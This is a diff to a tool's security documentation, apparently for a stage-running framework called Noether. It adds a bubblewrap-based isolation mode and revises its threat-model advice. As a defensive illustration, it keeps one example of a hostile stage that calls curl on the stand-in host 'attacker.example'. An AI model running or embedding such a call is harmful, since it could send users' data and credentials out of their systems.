@@ -29,31 +29,52 @@ running any stage you did not write.
   Nix and the matching store paths.
 - Blocks network access during **Nix evaluation** (build time).
 
-### What it does NOT do
+### What it does NOT do by default
 
-- **It does not sandbox the subprocess.** When a stage runs, the child
-  process inherits the host user's:
-  - Filesystem access (read `~/.ssh/*`, read env files, write anywhere)
-  - Network (arbitrary outbound HTTP, DNS, raw sockets)
-  - Environment variables (all parent env is inherited)
-  - Process privileges
-- A stage can legally do `import os; os.system("curl attacker.example/...")`.
+- **It does not sandbox the subprocess** when `--isolate=none`. A stage
+  without isolation inherits the host user's filesystem access,
+  network, environment, and process privileges. A stage can legally do
+  `import os; os.system("curl attacker.example/...")`.
 - The `__direct__` venv fallback (used when a stage declares
-  `# requires:` pip packages) bypasses Nix entirely and runs in the host's
-  Python.
+  `# requires:` pip packages) bypasses Nix entirely and runs in the
+  host's Python.
+
+### What isolation adds (v0.7+)
+
+`noether run --isolate=auto` (the default from v0.7) wraps each stage
+subprocess in a sandbox. Phase 1 uses **bubblewrap** when available:
+
+- Fresh user, PID, mount, UTS, IPC, and cgroup namespaces.
+- Read-only bind of `/nix/store`; read-write bind of a per-invocation
+  scratch directory as `/work`. Nothing outside `/work` is writable.
+- Fresh network namespace unless the stage declares `Effect::Network`.
+- All Linux capabilities dropped.
+- Environment cleared; only an allowlist (`PATH`, `HOME`, `NIX_PATH`,
+  `NIX_SSL_CERT_FILE`, locale vars) is passed through.
+
+Phase 2 (v0.8) replaces the bwrap wrapper with direct `unshare` +
+Landlock + seccomp syscalls — same policy, ~10× lower startup cost, no
+external binary. Design: `docs/roadmap/2026-04-18-stage-isolation.md`.
+
+`--isolate=none` restores legacy behaviour. It emits a loud warning
+unless `--unsafe-no-isolation` is also passed.
 
 ### What this means in practice
 
-**Safe:** running stages you wrote, stages from `stdlib`, stages you read
-end-to-end before running.
+**Safe** (with the default `--isolate=auto` + bubblewrap installed):
+running stdlib stages, running LLM-synthesized stages you haven't
+audited yet, running any stage whose declared effects match what it
+actually does. The sandbox blocks filesystem escape, arbitrary
+network calls, and credential theft.
 
-**Not safe:** running a stage pulled from a registry you don't fully trust,
-running a stage synthesized by an LLM without review, running any stage on
-a host with credentials you aren't willing to risk.
+**Still risky, even with isolation**: stages declared `Effect::Network`
+can still call arbitrary URLs — the sandbox only decides whether
+network is reachable at all, not where to. Audit network-effect stages
+or run them with per-stage URL allowlisting (not yet in v0.7 — tracked
+as follow-up).
 
-**If you need isolation**, wrap the child process yourself — `bwrap`,
-`firejail`, `nsjail` with seccomp, a throwaway container, or a VM. Noether
-does not ship this. Contributions welcome.
+**Without isolation** (`--isolate=none`): same posture as pre-v0.7 —
+suitable only for stages you wrote and audited yourself.
 
 ## Composition Verification
 
